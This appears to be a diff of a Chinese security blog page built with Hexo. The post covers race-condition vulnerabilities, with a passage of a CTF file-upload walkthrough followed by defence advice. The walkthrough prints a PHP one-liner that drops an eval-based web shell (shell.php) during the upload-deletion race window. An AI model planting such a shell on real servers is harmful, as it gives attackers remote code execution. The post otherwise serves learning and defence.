 <p>这样，我们可以在<code>BurpSuite</code>中同时拦截下这两个数据包，然后发送至Intruder模块，将payload设置为<code>Null Payload</code>，并开始攻击，这样我们还需要搭配上这样的一句PHP代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>), <span class="string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;shell.php&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span></code></pre></div>
 <p>它的作用是只要我们上传的文件能被成功访问，它就能在服务器上新建一个<code>shell.php</code>并将一句话写入，从而使我们能够成功<code>getshel</code>l~</p>
 <p>用两个不同的数据包设置<code>Null Payload</code>的作用是利用我们提到的“竞争窗口”即上传成功到被删除的这一小段时间去访问我们上传的内鬼让其在服务器上生成一个接应我们的shell，其实简单地说就是用两个不同的操作去同时读写一个文件</p>
-<p><img src="https://pic2.zhimg.com/80/v2-98252be57cdc6ace37d120354c2b5da1_720w.webp" alt="4"></p>
+<p><img src="https://pic2.zhimg.com/80/v2-98252be57cdc6ace37d120354c2b5da1_720w.webp" srcset="/img/loading.gif" lazyload alt="4"></p>
 <p>Success to upload！</p>
 <p>成功拿到flag：<code>cyberpeace&#123;This_is_a_sample_flag&#125;</code></p>
-<h4 id="0x03-如何防御？">0x03 如何防御？</h4>
-<p>以下总结了一些防御方法和常见条件竞争漏洞示例及防御</p>
-<p>(1) 使用同步机制<br>
-锁（Lock）：通过加锁确保同一时间只有一个线程或进程可以访问共享资源。<br>
-信号量（Semaphore）：限制同时访问资源的线程或进程数量。<br>
-互斥量（Mutex）：类似于锁，用于多线程环境。<br>
-(2) 原子操作<br>
-使用原子操作确保操作的不可分割性。<br>
-示例：<br>
-数据库中的事务（Transaction）。<br>
-编程语言中的原子类型（如 atomic 在 C++ 或 Java 中）。<br>
-(3) 避免共享资源<br>
-尽量减少共享资源的使用，采用线程本地存储（Thread Local Storage, TLS）或进程隔离。<br>
-示例：<br>
-使用线程本地变量代替全局变量。<br>
-(4) 文件操作防御<br>
-使用文件锁（File Lock）确保同一时间只有一个进程可以访问文件。<br>
-(5) 数据库操作防御<br>
-使用事务（Transaction）和锁机制（如行锁、表锁）确保数据一致性。<br>
-(6) 时间窗口最小化<br>
-减少竞争条件的发生概率，尽量缩短共享资源的访问时间。<br>
-示例：<br>
-在文件操作中，尽快释放文件锁。<br>
-(7) 使用不可变对象<br>
-使用不可变对象（Immutable Objects）避免共享资源被修改。<br>
-示例：<br>
-在函数式编程中，尽量使用不可变数据结构。<br>
-(8) 输入验证和边界检查<br>
-对用户输入进行严格验证，避免恶意输入触发竞争条件。<br>
-示例：<br>
-检查文件路径、用户权限等。<br>
-(9) 代码审查和测试<br>
-通过代码审查发现潜在的竞争条件。<br>
-使用压力测试和并发测试工具（如 JMeter、Locust）模拟高并发场景。</p>
-<p>常见条件竞争漏洞示例及防御<br>
-(1) TOCTOU（Time-of-Check to Time-of-Use）</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">漏洞描述：在检查资源状态和使用资源之间存在时间窗口，攻击者可以利用这个时间窗口修改资源状态。</span><br><span class="line"></span><br><span class="line">防御方法：</span><br><span class="line"></span><br><span class="line">    使用原子操作（如 open() 的 O_EXCL 标志）。</span><br><span class="line"></span><br><span class="line">    示例（C 语言）：</span><br><span class="line">    c</span><br><span class="line">    复制</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;file.txt&quot;</span>, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0644</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="comment">// 文件已存在</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h4 id="0x03-如何防御？"><a href="#0x03-如何防御？" class="headerlink" title="0x03 如何防御？"></a>0x03 如何防御？</h4><p>以下总结了一些防御方法和常见条件竞争漏洞示例及防御</p>
+<p>(1) 使用同步机制<br>    锁（Lock）：通过加锁确保同一时间只有一个线程或进程可以访问共享资源。<br>    信号量（Semaphore）：限制同时访问资源的线程或进程数量。<br>    互斥量（Mutex）：类似于锁，用于多线程环境。<br>(2) 原子操作<br>    使用原子操作确保操作的不可分割性。<br>    示例：<br>        数据库中的事务（Transaction）。<br>        编程语言中的原子类型（如 atomic 在 C++ 或 Java 中）。<br>(3) 避免共享资源<br>    尽量减少共享资源的使用，采用线程本地存储（Thread Local Storage, TLS）或进程隔离。<br>    示例：<br>        使用线程本地变量代替全局变量。<br>(4) 文件操作防御<br>    使用文件锁（File Lock）确保同一时间只有一个进程可以访问文件。<br>(5) 数据库操作防御<br>    使用事务（Transaction）和锁机制（如行锁、表锁）确保数据一致性。<br>(6) 时间窗口最小化<br>    减少竞争条件的发生概率，尽量缩短共享资源的访问时间。<br>    示例：<br>        在文件操作中，尽快释放文件锁。<br>(7) 使用不可变对象<br>    使用不可变对象（Immutable Objects）避免共享资源被修改。<br>    示例：<br>        在函数式编程中，尽量使用不可变数据结构。<br>(8) 输入验证和边界检查<br>    对用户输入进行严格验证，避免恶意输入触发竞争条件。<br>    示例：<br>        检查文件路径、用户权限等。<br>(9) 代码审查和测试<br>    通过代码审查发现潜在的竞争条件。<br>    使用压力测试和并发测试工具（如 JMeter、Locust）模拟高并发场景。</p>
+<p>常见条件竞争漏洞示例及防御<br>(1) TOCTOU（Time-of-Check to Time-of-Use）</p>
+<div class="code-wrapper"><pre><code class="hljs c">漏洞描述：在检查资源状态和使用资源之间存在时间窗口，攻击者可以利用这个时间窗口修改资源状态。
+
+防御方法：
+
+    使用原子操作（如 open() 的 O_EXCL 标志）。
+
+    示例（C 语言）：
+    c
+    复制
+
+    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;file.txt&quot;</span>, O_WRONLY | O_CREAT | O_EXCL, <span class="hljs-number">0644</span>);
+    <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;
+        <span class="hljs-comment">// 文件已存在</span>
+    &#125;</code></pre></div>
 <p>(2) 文件上传漏洞</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">漏洞描述：攻击者在上传文件时，利用时间窗口替换文件内容。</span><br><span class="line"></span><br><span class="line">防御方法：</span><br><span class="line"></span><br><span class="line">    使用临时文件，上传完成后再重命名。</span><br><span class="line"></span><br><span class="line">    示例：</span><br><span class="line">    python</span><br><span class="line">    复制</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">import</span> tempfile</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> tempfile.NamedTemporaryFile(delete=<span class="literal">False</span>) <span class="keyword">as</span> tmp_file:</span><br><span class="line">        tmp_file.write(<span class="string">b&quot;file content&quot;</span>)</span><br><span class="line">        tmp_path = tmp_file.name</span><br><span class="line"></span><br><span class="line">    os.rename(tmp_path, <span class="string">&quot;final_file.txt&quot;</span>)</span><br></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs python">漏洞描述：攻击者在上传文件时，利用时间窗口替换文件内容。
+
+防御方法：
+
+    使用临时文件，上传完成后再重命名。
+
+    示例：
+    python
+    复制
+
+    <span class="hljs-keyword">import</span> os
+    <span class="hljs-keyword">import</span> tempfile
+
+    <span class="hljs-keyword">with</span> tempfile.NamedTemporaryFile(delete=<span class="hljs-literal">False</span>) <span class="hljs-keyword">as</span> tmp_file:
+        tmp_file.write(<span class="hljs-string">b&quot;file content&quot;</span>)
+        tmp_path = tmp_file.name
+
+    os.rename(tmp_path, <span class="hljs-string">&quot;final_file.txt&quot;</span>)</code></pre></div>
 <p>(3) 并发修改共享变量</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">漏洞描述：多个线程同时修改共享变量，导致数据不一致。</span><br><span class="line"></span><br><span class="line">防御方法：</span><br><span class="line"></span><br><span class="line">    使用锁或原子操作。</span><br><span class="line"></span><br><span class="line">    示例（Java）：</span><br><span class="line">    java</span><br><span class="line">    复制</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> java.util.concurrent.atomic.AtomicInteger;</span><br><span class="line"></span><br><span class="line">    <span class="type">AtomicInteger</span> <span class="variable">sharedResource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicInteger</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateResource</span><span class="params">()</span> &#123;</span><br><span class="line">        sharedResource.incrementAndGet();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<h6 id="一些素材来源：">一些素材来源：</h6>
-<p><a target="_blank" rel="noopener" href="https://noa.pages.dev/posts/web_security/race_conditions/">Noah’s Blog</a></p>
+<div class="code-wrapper"><pre><code class="hljs java">漏洞描述：多个线程同时修改共享变量，导致数据不一致。
+
+防御方法：
+
+    使用锁或原子操作。
+
+    示例（Java）：
+    java
+    复制
+
+    <span class="hljs-keyword">import</span> java.util.concurrent.atomic.AtomicInteger;
+
+    <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">sharedResource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateResource</span><span class="hljs-params">()</span> &#123;
+        sharedResource.incrementAndGet();
+    &#125;</code></pre></div>
+<h6 id="一些素材来源："><a href="#一些素材来源：" class="headerlink" title="一些素材来源："></a>一些素材来源：</h6><p><a target="_blank" rel="noopener" href="https://noa.pages.dev/posts/web_security/race_conditions/">Noah’s Blog</a></p>
 <p><a target="_blank" rel="noopener" href="https://chat.deepseek.com/">DeepSeek</a></p>
 
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="category-chain-item">Web安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web%E5%AE%89%E5%85%A8/" class="print-no-link">#Web安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>条件竞争漏洞学习</div>
+      <div>https://fishcanf1y.github.io/2025/02/08/条件竞争漏洞学习/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>fishcanf1y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>February 8, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/04/19/Basic-ROP-Learning/" title="Basic ROP Learning">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Basic ROP Learning</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/02/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwnstack%E9%A2%98%E8%A7%A3/" title="攻防世界-pwnstack题解">
+                        <span class="hidden-mobile">攻防世界-pwnstack题解</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
     </div>
 
-    
-    
-    
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
 
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
-          </div>
-
-        
 
 
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2025/02/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwnstack%E9%A2%98%E8%A7%A3/" rel="prev" title="攻防世界-pwnstack题解">
-      <i class="fa fa-chevron-left"></i> 攻防世界-pwnstack题解
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2025/04/19/Basic-ROP-Learning/" rel="next" title="Basic ROP Learning">
-      Basic ROP Learning <i class="fa fa-chevron-right"></i>
-    </a></div>
+  </aside>
+
+
     </div>
-      </footer>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
     
-  </article>
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
   
   
   
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
 
 
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
 
-          </div>
-          
 
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
       }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
     }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
     });
-  }
+  });
 </script>
 
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
 
-  <aside class="sidebar">
-    <div class="sidebar-inner">
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
 
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
+  <script>Fluid.plugins.codeWidget();</script>
 
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web%E5%AE%89%E5%85%A8%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.</span> <span class="nav-text">Web安全条件竞争漏洞学习</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00-%E6%A6%82%E8%BF%B0"><span class="nav-number">1.0.1.</span> <span class="nav-text">0x00 概述</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E6%9D%A5%E8%AF%B4%EF%BC%8C%E5%B0%B1%E6%98%AF%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%97%B6%E6%93%8D%E4%BD%9C%E4%B8%80%E4%B8%AA%E5%AF%B9%E8%B1%A1%EF%BC%8C%E8%80%8C%E6%B2%A1%E6%9C%89%E5%AF%B9%E5%AF%B9%E8%B1%A1%E8%BF%9B%E8%A1%8C%E5%8A%A0%E9%94%81%E7%AD%89%E4%BF%9D%E8%AF%81%E4%B8%80%E8%87%B4%E6%80%A7%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="nav-number">1.0.1.0.1.</span> <span class="nav-text">简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90"><span class="nav-number">1.0.2.</span> <span class="nav-text">0x01 简单分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-CTF%E4%B8%AD%E7%9A%84%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">1.0.3.</span> <span class="nav-text">0x02 CTF中的条件竞争</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1%EF%BC%9F"><span class="nav-number">1.0.4.</span> <span class="nav-text">0x03 如何防御？</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E7%B4%A0%E6%9D%90%E6%9D%A5%E6%BA%90%EF%BC%9A"><span class="nav-number">1.0.4.0.1.</span> <span class="nav-text">一些素材来源：</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="V4Ethan"
-      src="/images/avatar.jpg">
-  <p class="site-author-name" itemprop="name">V4Ethan</p>
-  <div class="site-description" itemprop="description">V4Ethan's Blog</div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/index.html">
-        
-          <span class="site-state-item-count">11</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-        <span class="site-state-item-count">4</span>
-        <span class="site-state-item-name">categories</span>
-      </div>
-      <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">5</span>
-        <span class="site-state-item-name">tags</span>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-        <a href="https://github.com/V4Ethan" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;V4Ethan" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="mailto:iszhenghailin@gmail.com" title="E-Mail → mailto:iszhenghailin@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
-      </span>
-  </div>
-
-
-
-      </div>
-
-    </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2025</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">V4Ethan</span>
-</div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
-  </div>
-
-        
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
-  </div>
 
   
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
 
-<script src="/js/utils.js"></script>
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
 
-<script src="/js/motion.js"></script>
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
 
 
-<script src="/js/schemes/pisces.js"></script>
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
 
 
-<script src="/js/next-boot.js"></script>
 
 
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
 
 
   
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
 </body>
 </html>
